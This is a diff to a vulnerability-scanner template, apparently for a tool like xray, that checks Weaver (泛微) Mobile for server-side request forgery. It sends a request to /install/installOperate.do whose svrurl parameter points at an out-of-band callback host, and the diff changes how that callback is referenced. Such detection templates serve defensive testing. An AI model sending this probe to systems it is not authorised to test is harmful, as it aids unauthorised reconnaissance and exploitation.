@@ -13,13 +13,10 @@ info:
   tags: 泛微,Mobile,SSRF
   created: 2025/1/22
 
-set:
-  oob: oob()
-  oobHTTP: oob.HTTP
 rules:
   r0:
     request:
       method: GET
-      path: /install/installOperate.do?svrurl={{oobHTTP}}
-    expression: response.status == 302 && oobCheck(oob, oob.ProtocolHTTP, 3)
+      path: /install/installOperate.do?svrurl={{oob.HTTP}}
+    expression: response.status == 302 && oobCheck(oob.ProtocolHTTP, 3)
 expression: r0()
